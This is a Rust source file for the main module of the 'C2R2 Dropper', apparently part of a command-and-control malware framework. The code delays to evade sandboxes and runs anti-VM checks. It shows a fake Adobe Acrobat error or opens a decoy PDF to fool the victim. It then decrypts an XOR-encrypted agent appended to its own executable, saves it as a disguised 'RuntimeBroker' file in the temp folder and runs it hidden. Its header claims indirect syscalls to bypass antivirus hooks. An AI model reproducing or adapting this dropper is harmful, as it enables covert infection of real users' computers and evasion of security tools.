//! C2R2 Dropper - Embedded Payload Execution
//!
//! This dropper supports two modes:
//! 1. COMPILED mode: Payload embedded at compile time via config.rs
//! 2. STANDALONE mode: Payload appended to the executable (no recompilation needed)
//!
//! Features:
//! - XOR-encrypted payload (agent or shellcode)
//! - Anti-sandbox/Anti-VM checks
//! - Displaying a decoy PDF
//! - Stealthy execution
//! - INDIRECT SYSCALLS via dinvk for memory allocation (bypasses AV/EDR hooks)

#![cfg_attr(feature = "production", windows_subsystem = "windows")]

mod config;
mod evasion;
mod shellcode;
mod syscalls;

use std::thread;
use std::time::Duration;

/// Magic marker for appended payload data
const PAYLOAD_MARKER: &[u8] = b"C2R2_PAYLOAD_DATA_START_MARKER__";

fn main() {
    // Step 1: Initial delay to evade sandbox time acceleration
    thread::sleep(Duration::from_secs(3));

    // Step 2: Run anti-sandbox checks (production only)
    #[cfg(feature = "production")]
    {
        if evasion::is_sandbox_detected() {
            // Exit silently - maybe show a fake error
            show_fake_error();
            return;
        }
    }

    // Step 3: Additional human-like delay
    let delay = evasion::get_random_delay(1000, 3000);
    thread::sleep(Duration::from_millis(delay));

    // Step 4: Open decoy document (PDF) to look legitimate
    #[cfg(target_os = "windows")]
    {
        let _ = open_decoy_pdf();
    }

    // Step 5: Small delay after opening PDF
    thread::sleep(Duration::from_millis(500));

    // Step 6: Execute payload
    // First try standalone mode (appended payload), then fall back to compiled mode
    #[cfg(target_os = "windows")]
    {
        // Try standalone mode first (payload appended to executable)
        if let Some((xor_key, encrypted_agent)) = try_extract_appended_payload() {
            // Execute appended agent
            if let Err(_) = execute_appended_agent(&xor_key, &encrypted_agent) {
                // Fail silently
            }
        } else {
            // Fall back to compiled mode (config.rs)
            if let Err(_) = shellcode::execute_shellcode() {
                // Fail silently
            }
        }
    }
}

/// Try to extract payload appended to this executable
#[cfg(target_os = "windows")]
fn try_extract_appended_payload() -> Option<(Vec<u8>, Vec<u8>)> {
    use std::env;
    use std::fs::File;
    use std::io::Read;

    // Get path to current executable
    let exe_path = env::current_exe().ok()?;

    // Read entire executable
    let mut file = File::open(&exe_path).ok()?;
    let mut data = Vec::new();
    file.read_to_end(&mut data).ok()?;

    // Find payload marker
    let marker_pos = data
        .windows(PAYLOAD_MARKER.len())
        .position(|window| window == PAYLOAD_MARKER)?;

    let start_pos = marker_pos + PAYLOAD_MARKER.len();

    // Read XOR key length (4 bytes, little endian)
    if start_pos + 4 > data.len() {
        return None;
    }
    let key_len = u32::from_le_bytes([
        data[start_pos],
        data[start_pos + 1],
        data[start_pos + 2],
        data[start_pos + 3],
    ]) as usize;

    // Read XOR key
    let key_start = start_pos + 4;
    if key_start + key_len > data.len() {
        return None;
    }
    let xor_key = data[key_start..key_start + key_len].to_vec();

    // Read agent length (4 bytes, little endian)
    let agent_len_start = key_start + key_len;
    if agent_len_start + 4 > data.len() {
        return None;
    }
    let agent_len = u32::from_le_bytes([
        data[agent_len_start],
        data[agent_len_start + 1],
        data[agent_len_start + 2],
        data[agent_len_start + 3],
    ]) as usize;

    // Read encrypted agent
    let agent_start = agent_len_start + 4;
    if agent_start + agent_len > data.len() {
        return None;
    }
    let encrypted_agent = data[agent_start..agent_start + agent_len].to_vec();

    Some((xor_key, encrypted_agent))
}

/// Execute an appended encrypted agent
#[cfg(target_os = "windows")]
fn execute_appended_agent(
    xor_key: &[u8],
    encrypted_agent: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    use rand::Rng;
    use std::fs::File;
    use std::io::Write;
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    // Decrypt agent
    let agent_bytes = xor_decrypt(encrypted_agent, xor_key);

    // Create temp file with random name that looks legitimate
    let temp_dir = std::env::temp_dir();
    let random_suffix: u32 = rand::thread_rng().gen();
    let exe_name = format!("{}_{}.exe", obfstr!("RuntimeBroker"), random_suffix);
    let exe_path = temp_dir.join(&exe_name);

    // Write decrypted agent
    let mut file = File::create(&exe_path)?;
    file.write_all(&agent_bytes)?;
    drop(file);

    // Execute agent in background (hidden window)
    // CREATE_NO_WINDOW = 0x08000000
    Command::new(&exe_path).creation_flags(0x08000000).spawn()?;

    Ok(())
}

/// Decrypt data using XOR
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Show a fake error message to look like a corrupted PDF
#[cfg(target_os = "windows")]
fn show_fake_error() {
    use obfstr::obfstr;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr;
    use winapi::um::winuser::{MessageBoxW, MB_ICONERROR, MB_OK};

    unsafe {
        let title: Vec<u16> = OsStr::new(obfstr!("Adobe Acrobat Reader"))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let message: Vec<u16> =
            OsStr::new(obfstr!("The file is damaged and could not be repaired."))
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();

        MessageBoxW(
            ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONERROR,
        );
    }
}

#[cfg(not(target_os = "windows"))]
fn show_fake_error() {}

/// Open a decoy PDF embedded or from temp
#[cfg(target_os = "windows")]
fn open_decoy_pdf() -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    use std::env;
    use std::fs::File;
    use std::io::Write;

    // Get temp directory
    let temp_dir = env::temp_dir();
    let pdf_path = temp_dir.join(obfstr!("Document.pdf"));

    // Write embedded PDF decoy (minimal valid PDF)
    let pdf_data = config::DECOY_PDF_DATA;
    if !pdf_data.is_empty() {
        let mut file = File::create(&pdf_path)?;
        file.write_all(pdf_data)?;

        // Open with default PDF viewer
        open_file(&pdf_path);
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn open_file(path: &std::path::PathBuf) {
    use obfstr::obfstr;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr;
    use winapi::um::shellapi::ShellExecuteW;
    use winapi::um::winuser::SW_SHOWNORMAL;

    // Only proceed if we have a valid path
    let path_str = match path.to_str() {
        Some(s) if !s.is_empty() => s,
        _ => return, // Skip if path is invalid
    };

    unsafe {
        let operation: Vec<u16> = OsStr::new(obfstr!("open"))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let path_wide: Vec<u16> = OsStr::new(path_str)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        ShellExecuteW(
            ptr::null_mut(),
            operation.as_ptr(),
            path_wide.as_ptr(),
            ptr::null(),
            ptr::null(),
            SW_SHOWNORMAL,
        );
    }
}
